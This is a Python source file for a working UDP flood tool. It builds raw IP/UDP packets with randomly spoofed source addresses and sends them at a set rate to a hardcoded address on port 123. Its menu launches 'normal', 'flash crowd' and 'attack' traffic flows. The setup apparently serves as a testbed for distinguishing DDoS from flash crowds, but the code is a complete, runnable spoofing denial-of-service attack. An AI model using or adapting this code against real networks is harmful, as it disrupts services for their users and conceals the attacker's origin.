import socket
import struct
import time
import sys
from random import randint, random, uniform
from multiprocessing import Process

class UDPPacketBuilder():
    def __init__(self, source_ip, dest_ip, src_port, dest_port, ip_id, ttl, data):
        packet = self.generateIPHeader(source_ip, dest_ip, ip_id, ttl)
        packet += self.generateUDPHeader(src_port, dest_port, len(data))
        packet += data

        self.packet = packet

    def generateUDPHeader(self, src_port, dest_port, data_len):
        udp_length = 8 + data_len
        checksum = randint(1,65535) #did not make effort to calculate the correct checksum

        return struct.pack('!4H', src_port, dest_port, udp_length, checksum)
    
    def generateIPHeader(self, source_ip, dest_ip, id, ttl):
        # ip header fields
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 0	# kernel will fill the correct total length
        ip_id = id	# Id of this packet
        ip_frag_off = 0
        ip_ttl = ttl
        ip_proto = socket.IPPROTO_UDP
        ip_check = 0	# kernel will fill the correct checksum
        ip_saddr = socket.inet_aton ( source_ip )	#Spoof the source ip address if you want to
        ip_daddr = socket.inet_aton ( dest_ip )

        ip_ihl_ver = (ip_ver << 4) + ip_ihl

        return struct.pack('!BBHHHBBH4s4s' , ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)

    def getPacket(self):
        return self.packet

class AdvancedUDPFlooder():
    def __init__(self, dest_ip, dest_port, mbps, ratio, rand=True, name='default'):
        self.name = name
        
        # Raw Socket
        self.s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        self.dest_ip = dest_ip
        self.dest_port = dest_port

        # Variables For Timing Packets
        self.RATIO = ratio
        self.MBPS = mbps
        self.PPS = self.MBPS * 100                      # Packets Per Second, 1mbps = 100pps
        self.CPS = int(self.PPS * self.RATIO)           # Connections Per Second
        self.PPC = int(self.PPS/self.CPS)               # Packets Per Connection
        self.PPS_REMINDER = self.PPS % self.CPS         # Packets Reminder
        self.counter = 0                                # Global counter used for randomizing source port and packet ID

        # Generating Random Data buffer, buffer size is tuned to 100 PPS = 1MB
        floatlist = [random() for x in range(300)]
        self.data = struct.pack('%sf' % len(floatlist), *floatlist)

        # Divisor for for spreading packets over a whole second
        self.DIVISOR = 10
        
        # Proccess For Sending UDP Flood Packets
        self.proc = Process(target=self.sendUDP)

        # Variable used to control packet randomization, if set to True, source port, packet id , ttl and ip address will get randomized.
        self.random = rand 

    def buildPacket(self):
        
        counter = (self.counter % 65534) + 1
        if self.random:
            source_port = counter
            ip_id = counter
            ttl = randint(10,254)
        else:
            source_port = counter
            ip_id = self.dest_port
            ttl = 255
        
        self.counter +=1

        source_ip = f'{randint(1,192)}.{randint(1,255)}.{randint(1,255)}.{randint(1,254)}'
        dest_ip = self.dest_ip
        dest_port = self.dest_port
        data = self.data
        
        return UDPPacketBuilder(source_ip, dest_ip, source_port, dest_port, ip_id, ttl, data).getPacket()
     
    def sendUDP(self):
        while True:
            cycle_start = int(time.time() * 1000)

            #Sending packets fiiting equally in each connection
            for x in range(self.CPS//self.DIVISOR):
                packet = self.buildPacket() # Building Packet with spoofed ip and random source port
                for y in range(self.PPC):
                    try: 
                        self.s.sendto(packet, (self.dest_ip, self.dest_port))
                    except OSError:
                        print("OSError: sending buffer is full")

            
            #Sending the remaining packets which did not fit equally on the last connection
            for x in range(self.PPS_REMINDER//self.DIVISOR):
                try: 
                    self.s.sendto(packet, (self.dest_ip, self.dest_port))
                except OSError:
                    print("OSError: sending buffer is full")
            
            cycle_end = int(time.time() * 1000.0)
            cycle_time = ((cycle_end - cycle_start)/1000)
            cycle_time = cycle_time 
            if cycle_time >= 1/self.DIVISOR:
                continue

            time.sleep((1/self.DIVISOR) - cycle_time)
        
    def start(self):
        self.proc.start()

    def stop(self):
        self.proc.terminate()

    def printFlow(self):
        print(f'{self.name} - Mbps={self.MBPS} PPS={self.PPS} CPS={self.CPS} Ratio={self.RATIO}')

class Menu():
    def __init__(self):
        self.location = "" # location can recevie 3 values: 'Main', 'Flash', 'Attack'
        self.options = {"Main": ["1. Start a Flash Crowd Flood", "2. Start an Attack", "3. Exit"], "Flash": ["1. Stop Flash Crowd"], "Attack": ["1. Stop Attack"]}
        self.executeFunc = {"Main": self.executeMainOption , "Flash":self.executeFlashOption, "Attack":self.executeAttackOption}
    
    def myIntegerInput(self, msg):
        try:
            return int(input(msg))
        except:
            print("Error: Option is out of range")
            return 0
    
    def myFloatInput(self, msg):
        try:
            return float(input(msg))
        except:
            print("Error: Option is out of range")
            return 0

    def printMenu(self):
        print("\r\n***********************Current Flows***********************")
        self.normalAdvUdpFlooder.printFlow()
        if "Flash" in self.location:
            self.flashAdvUdpFlooder.printFlow()
        if "Attack" in self.location:
            self.atkAdvUdpFlooder.printFlow()
        print("***********************************************************")
        for option in self.options[self.location]:
            print(option)

    def executeMainOption(self,option):
        if option == 1:
            self.location = "Flash"
            self.flashAdvUdpFlooder = AdvancedUDPFlooder('155.1.102.100', 123, 15, 0.5, name="Flash Crowd Traffic")
            self.flashAdvUdpFlooder.start()
            return
        if option == 2:
            self.location = "Attack"
            self.atkAdvUdpFlooder = AdvancedUDPFlooder('155.1.102.100', 123, 18, 0.1, rand=False, name="Attack Traffic")
            self.atkAdvUdpFlooder.start()
            return
        if option == 3:
            self.normalAdvUdpFlooder.stop()
            exit(0)

    def executeFlashOption(self, option):
        self.printMenu()

        if option == 1:
            self.flashAdvUdpFlooder.stop()
            self.location = "Main"
            return

    def executeAttackOption(self, option):
        self.printMenu()

        if option == 1:
            self.atkAdvUdpFlooder.stop()
            self.location = "Main"
            return
        return

    def checkOption(self, option):
        if option > len(self.options[self.location]):
            print("Error: Option is out of range")
        
        self.executeFunc[self.location](option)

    def start(self):
        self.normalAdvUdpFlooder = AdvancedUDPFlooder('155.1.102.100', 123, 10, 0.5, name="Normal Traffic")
        self.normalAdvUdpFlooder.start()
        self.location = "Main"       

        while True:
            self.printMenu()
            self.checkOption(self.myIntegerInput("Choose An Option: "))
            
if __name__ == "__main__":
    Menu().start()
